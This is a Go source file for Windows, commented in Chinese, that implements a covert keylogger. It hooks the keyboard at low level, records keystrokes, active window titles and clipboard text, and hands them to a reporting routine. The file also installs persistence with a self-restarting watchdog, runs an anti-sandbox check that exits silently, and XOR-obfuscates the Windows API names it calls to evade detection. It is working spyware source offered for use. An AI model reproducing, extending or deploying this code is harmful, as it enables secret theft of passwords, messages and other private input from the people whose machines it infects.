//go:build windows

package cmd

import (
	"fmt"
	"os"
	"syscall"
	"time"
	"unsafe"

	"github.com/spf13/cobra"
)

// KeyLoggerCmd 以下来源：github.com/uknowsec/keylogger,感谢！
func KeyLoggerCmd(_ *cobra.Command, _ []string) {
	deployArgs := filterArgs(os.Args[1:])
	dbgLog("启动 install=%v watchdog=%v uninstall=%v debug=%v args=%v",
		installFlag, watchdogFlag, uninstallFlag, debugFlag, os.Args[1:])
	// --install 优先:即使误带 --watchdog 也先执行安装
	if installFlag {
		installPersistence(deployArgs)
		return
	}
	if uninstallFlag {
		uninstallPersistence()
		return
	}
	if watchdogFlag {
		watchdogLoop(deployArgs)
		return
	}
	// 单实例保护:计划任务/看门狗重复拉起时静默退出。
	// 注意:互斥体必须在反沙箱检查之前取得——检查等待期可达 --delay 秒,
	// 若不持互斥体,看门狗每轮(默认 5 秒)都会再拉起一个新实例,数百秒
	// 窗口内堆积数十个进程(旧版缺陷:CPU 打满、桌面转圈、主流程迟迟不走)。
	if !takeMutex(mutexNameMain) {
		dbgLog("main: 未取得主互斥体,退出(已有实例在运行)")
		fmt.Println("[-] 已有实例在运行,退出")
		return
	}
	// 反沙箱检查:--stealth 时通过前不执行上报/钩子等敏感动作,超时静默退出。
	// 检查失败退出后互斥体随进程消亡自动释放,看门狗会再次拉起重试,
	// 但任意时刻最多只有一个等待实例。
	if !stealthGate() {
		dbgLog("main: 反沙箱检查未通过,静默退出")
		exitSilent()
	}
	dbgLog("main: 已取得主互斥体,isInstalledCopy=%v", isInstalledCopy())
	startReporter()
	go clipboardLogger()
	go WindowLogger()
	if isInstalledCopy() {
		go ensureWatchdog(deployArgs) // 主实例与看门狗互保
	}
	Keylogger()
}

// 未按shift
var keys_low = map[uint16]string{
	8:   "[Back]",
	9:   "[Tab]",
	10:  "[Shift]",
	13:  "[Enter]\r\n",
	17:  "[Ctrl]",
	18:  "[Alt]",
	27:  "[Esc]",
	32:  " ", //SPACE
	33:  "[PageUp]",
	34:  "[PageDown]",
	35:  "[End]",
	36:  "[Home]",
	37:  "[Left]",
	38:  "[Up]",
	39:  "[Right]",
	40:  "[Down]",
	41:  "[Select]",
	42:  "[Print]",
	43:  "[Execute]",
	44:  "[PrintScreen]",
	45:  "[Insert]",
	46:  "[Delete]",
	47:  "[Help]",
	48:  "0",
	49:  "1",
	50:  "2",
	51:  "3",
	52:  "4",
	53:  "5",
	54:  "6",
	55:  "7",
	56:  "8",
	57:  "9",
	65:  "a",
	66:  "b",
	67:  "c",
	68:  "d",
	69:  "e",
	70:  "f",
	71:  "g",
	72:  "h",
	73:  "i",
	74:  "j",
	75:  "k",
	76:  "l",
	77:  "m",
	78:  "n",
	79:  "o",
	80:  "p",
	81:  "q",
	82:  "r",
	83:  "s",
	84:  "t",
	85:  "u",
	86:  "v",
	87:  "w",
	88:  "x",
	89:  "y",
	90:  "z",
	91:  "[Windows]",
	92:  "[Windows]",
	93:  "[Applications]",
	95:  "[Sleep]",
	96:  "0",
	97:  "1",
	98:  "2",
	99:  "3",
	100: "4",
	101: "5",
	102: "6",
	103: "7",
	104: "8",
	105: "9",
	106: "*",
	107: "+",
	108: "[Separator]",
	109: "-",
	110: ".",
	111: "[Divide]",
	112: "[F1]",
	113: "[F2]",
	114: "[F3]",
	115: "[F4]",
	116: "[F5]",
	117: "[F6]",
	118: "[F7]",
	119: "[F8]",
	120: "[F9]",
	121: "[F10]",
	122: "[F11]",
	123: "[F12]",
	144: "[NumLock]",
	145: "[ScrollLock]",
	162: "[Ctrl]",
	163: "[Ctrl]",
	164: "[Alt]", //LeftMenu
	165: "[RightMenu]",
	186: ";",
	187: "=",
	188: ",",
	189: "-",
	190: ".",
	191: "/",
	192: "`",
	219: "[",
	220: "\\",
	221: "]",
	222: "'",
	223: "!",
}

// SHIFT
var keys_high = map[uint16]string{
	8:   "[Back]",
	9:   "[Tab]",
	10:  "[Shift]",
	13:  "[Enter]\r\n",
	17:  "[Ctrl]",
	18:  "[Alt]",
	27:  "[Esc]",
	32:  " ", //SPACE
	33:  "[PageUp]",
	34:  "[PageDown]",
	35:  "[End]",
	36:  "[Home]",
	37:  "[Left]",
	38:  "[Up]",
	39:  "[Right]",
	40:  "[Down]",
	41:  "[Select]",
	42:  "[Print]",
	43:  "[Execute]",
	44:  "[PrintScreen]",
	45:  "[Insert]",
	46:  "[Delete]",
	47:  "[Help]",
	48:  ")",
	49:  "!",
	50:  "@",
	51:  "#",
	52:  "$",
	53:  "%",
	54:  "^",
	55:  "&",
	56:  "*",
	57:  "(",
	65:  "A",
	66:  "B",
	67:  "C",
	68:  "D",
	69:  "E",
	70:  "F",
	71:  "G",
	72:  "H",
	73:  "I",
	74:  "J",
	75:  "K",
	76:  "L",
	77:  "M",
	78:  "N",
	79:  "O",
	80:  "P",
	81:  "Q",
	82:  "R",
	83:  "S",
	84:  "T",
	85:  "U",
	86:  "V",
	87:  "W",
	88:  "X",
	89:  "Y",
	90:  "Z",
	91:  "[Windows]",
	92:  "[Windows]",
	93:  "[Applications]",
	95:  "[Sleep]",
	96:  "0",
	97:  "1",
	98:  "2",
	99:  "3",
	100: "4",
	101: "5",
	102: "6",
	103: "7",
	104: "8",
	105: "9",
	106: "*",
	107: "+",
	108: "[Separator]",
	109: "-",
	110: ".",
	111: "[Divide]",
	112: "[F1]",
	113: "[F2]",
	114: "[F3]",
	115: "[F4]",
	116: "[F5]",
	117: "[F6]",
	118: "[F7]",
	119: "[F8]",
	120: "[F9]",
	121: "[F10]",
	122: "[F11]",
	123: "[F12]",
	144: "[NumLock]",
	145: "[ScrollLock]",
	162: "[Ctrl]",
	163: "[Ctrl]",
	164: "[Alt]", //LeftMenu
	165: "[RightMenu]",
	186: ":",
	187: "+",
	188: "<",
	189: "_",
	190: ">",
	191: "?",
	192: "~",
	219: "°",
	220: "|",
	221: "}",
	222: "\"",
	223: "!",
}

// 大小写
var capup = map[uint16]string{
	8:   "[Back]",
	9:   "[Tab]",
	10:  "[Shift]",
	13:  "[Enter]\r\n",
	17:  "[Ctrl]",
	18:  "[Alt]",
	27:  "[Esc]",
	32:  " ", //SPACE
	33:  "[PageUp]",
	34:  "[PageDown]",
	35:  "[End]",
	36:  "[Home]",
	37:  "[Left]",
	38:  "[Up]",
	39:  "[Right]",
	40:  "[Down]",
	41:  "[Select]",
	42:  "[Print]",
	43:  "[Execute]",
	44:  "[PrintScreen]",
	45:  "[Insert]",
	46:  "[Delete]",
	47:  "[Help]",
	48:  "0",
	49:  "1",
	50:  "2",
	51:  "3",
	52:  "4",
	53:  "5",
	54:  "6",
	55:  "7",
	56:  "8",
	57:  "9",
	65:  "A",
	66:  "B",
	67:  "C",
	68:  "D",
	69:  "E",
	70:  "F",
	71:  "G",
	72:  "H",
	73:  "I",
	74:  "J",
	75:  "K",
	76:  "L",
	77:  "M",
	78:  "N",
	79:  "O",
	80:  "P",
	81:  "Q",
	82:  "R",
	83:  "S",
	84:  "T",
	85:  "U",
	86:  "V",
	87:  "W",
	88:  "X",
	89:  "Y",
	90:  "Z",
	91:  "[Windows]",
	92:  "[Windows]",
	93:  "[Applications]",
	95:  "[Sleep]",
	96:  "0",
	97:  "1",
	98:  "2",
	99:  "3",
	100: "4",
	101: "5",
	102: "6",
	103: "7",
	104: "8",
	105: "9",
	106: "*",
	107: "+",
	108: "[Separator]",
	109: "-",
	110: ".",
	111: "[Divide]",
	112: "[F1]",
	113: "[F2]",
	114: "[F3]",
	115: "[F4]",
	116: "[F5]",
	117: "[F6]",
	118: "[F7]",
	119: "[F8]",
	120: "[F9]",
	121: "[F10]",
	122: "[F11]",
	123: "[F12]",
	144: "[NumLock]",
	145: "[ScrollLock]",
	162: "[Ctrl]",
	163: "[Ctrl]",
	164: "[Alt]", //LeftMenu
	165: "[RightMenu]",
	186: ";",
	187: "=",
	188: ",",
	189: "-",
	190: ".",
	191: "/",
	192: "`",
	219: "[",
	220: "\\",
	221: "]",
	222: "'",
	223: "!",
}

var (
	pSetHook       uintptr
	pNextHook      uintptr
	pUnhook        uintptr
	pGetMsg        uintptr
	pGetKey        uintptr
	pGetAsyncKey   uintptr
	pGetForeground uintptr
	pGetWinText    uintptr
	keyboardHook   HHOOK
)

func init() {
	pSetHook = procAddr(user32, x("\x34\x55\x18\x66\x07\x25\x57\x16\x10\x43\x24\x5e\x01\x20\x76\x01\x30"))
	pNextHook = procAddr(user32, x("\x24\x51\x00\x5d\x20\x2e\x4b\x0d\x2f\x5f\x03\x5a\x2b\x33"))
	pUnhook = procAddr(user32, x("\x32\x5e\x04\x5e\x01\x20\x64\x10\x09\x54\x03\x46\x1d\x03\x5c\x16\x0c\x75\x14"))
	pGetMsg = procAddr(user32, x("\x20\x55\x18\x7c\x0b\x38\x40\x18\x00\x55\x3b"))
	pGetKey = procAddr(user32, x("\x20\x55\x18\x7a\x0b\x32\x60\x0d\x06\x44\x09"))
	pGetAsyncKey = procAddr(user32, x("\x20\x55\x18\x70\x1d\x32\x5d\x1a\x2c\x55\x15\x62\x1a\x2a\x47\x1c"))
	pGetForeground = procAddr(user32, x("\x20\x55\x18\x77\x01\x39\x56\x1e\x15\x5f\x19\x5f\x0a\x1c\x5a\x17\x03\x5f\x1b"))
	pGetWinText = procAddr(user32, x("\x20\x55\x18\x66\x07\x25\x57\x16\x10\x64\x09\x49\x1a\x1c"))
}

const (
	WH_KEYBOARD_LL = 13
	WM_KEYDOWN     = 256
	vkCapital      = 0x14 // VK_CAPITAL
	vkShift        = 0x10 // VK_SHIFT
)

type (
	DWORD     uint32
	WPARAM    uintptr
	LPARAM    uintptr
	LRESULT   uintptr
	HANDLE    uintptr
	HINSTANCE HANDLE
	HHOOK     HANDLE
	HWND      HANDLE
)

// lparam 为 OS 传入的原始指针，使用 unsafe.Pointer 避免 uintptr→unsafe.Pointer 转换
type HOOKPROC func(int, WPARAM, unsafe.Pointer) LRESULT

type KBDLLHOOKSTRUCT struct {
	VkCode      DWORD
	ScanCode    DWORD
	Flags       DWORD
	Time        DWORD
	DwExtraInfo uintptr
}

type POINT struct {
	X, Y int32
}

type MSG struct {
	Hwnd    HWND
	Message uint32
	WParam  uintptr
	LParam  uintptr
	Time    uint32
	Pt      POINT
}

func setHook(idHook int, lpfn HOOKPROC, hMod HINSTANCE, dwThreadId DWORD) HHOOK {
	ret, _, _ := callProc(pSetHook,
		uintptr(idHook),
		uintptr(syscall.NewCallback(lpfn)),
		uintptr(hMod),
		uintptr(dwThreadId),
	)
	return HHOOK(ret)
}

func nextHook(hhk HHOOK, nCode int, wParam WPARAM, lParam LPARAM) LRESULT {
	ret, _, _ := callProc(pNextHook,
		uintptr(hhk), uintptr(nCode), uintptr(wParam), uintptr(lParam),
	)
	return LRESULT(ret)
}

func unhook(hhk HHOOK) bool {
	ret, _, _ := callProc(pUnhook, uintptr(hhk))
	return ret != 0
}

func getMsg(msg *MSG, hwnd HWND, msgFilterMin uint32, msgFilterMax uint32) int {
	ret, _, _ := callProc(pGetMsg,
		uintptr(unsafe.Pointer(msg)),
		uintptr(hwnd),
		uintptr(msgFilterMin),
		uintptr(msgFilterMax),
	)
	return int(ret)
}

func getForeground() (hwnd syscall.Handle, err error) {
	r0, _, e1 := callProc(pGetForeground)
	if e1 != 0 {
		err = error(e1)
		return
	}
	hwnd = syscall.Handle(r0)
	return
}

func getWinText(hwnd syscall.Handle, str *uint16, maxCount int32) (len int32, err error) {
	r0, _, e1 := callProc(pGetWinText, uintptr(hwnd), uintptr(unsafe.Pointer(str)), uintptr(maxCount))
	len = int32(r0)
	if len == 0 {
		if e1 != 0 {
			err = error(e1)
		} else {
			err = syscall.EINVAL
		}
	}
	return
}

func WindowLogger() {

	var tmpTitle string
	for {
		g, _ := getForeground()
		b := make([]uint16, 200)
		_, _ = getWinText(g, &b[0], int32(len(b)))
		if t := syscall.UTF16ToString(b); t != "" && t != tmpTitle {
			tmpTitle = t
			setWindowTitle(t)
			pushEvent("window", t)
		}
		time.Sleep(1 * time.Millisecond)
	}
}

func Keylogger() {
	var msg MSG
	CAPS, _, _ := callProc(pGetKey, vkCapital)
	CAPS = CAPS & 0x000001
	var CAPS2 uintptr
	var SHIFT uintptr
	// var precLog string = ""
	//var write bool = false
	keyboardHook = setHook(WH_KEYBOARD_LL, (HOOKPROC)(func(nCode int, wparam WPARAM, lparam unsafe.Pointer) LRESULT {
		if nCode == 0 && wparam == WM_KEYDOWN {
			SHIFT, _, _ = callProc(pGetAsyncKey, vkShift)
			if SHIFT == 32769 || SHIFT == 32768 {

				SHIFT = 1
			}
			kbdstruct := (*KBDLLHOOKSTRUCT)(lparam)
			code := byte(kbdstruct.VkCode)
			if code == byte(vkCapital) {
				if CAPS == 1 {
					CAPS = 0
				} else {
					CAPS = 1
				}
			}
			if SHIFT == 1 {
				CAPS2 = 1
			} else {
				CAPS2 = 0
			}
			//未按shift
			if CAPS == 0 && CAPS2 == 0 {
				pushEvent("key", keys_low[uint16(code)])

			} else if CAPS2 == 1 {
				pushEvent("key", keys_high[uint16(code)])
			} else {
				pushEvent("key", capup[uint16(code)])
			}

		}
		return nextHook(keyboardHook, nCode, wparam, LPARAM(uintptr(lparam)))
	}), 0, 0)

	for getMsg(&msg, 0, 0, 0) != 0 {
		time.Sleep(1 * time.Millisecond)
	}

	unhook(keyboardHook)
	keyboardHook = 0
}

func clipboardLogger() {

	text, _ := readClipboard()

	for {
		text1, _ := readClipboard()
		if text1 != "" && text1 != text {
			pushEvent("clipboard", text1)
			text = text1

		}
		time.Sleep(20 * time.Millisecond)

	}

}
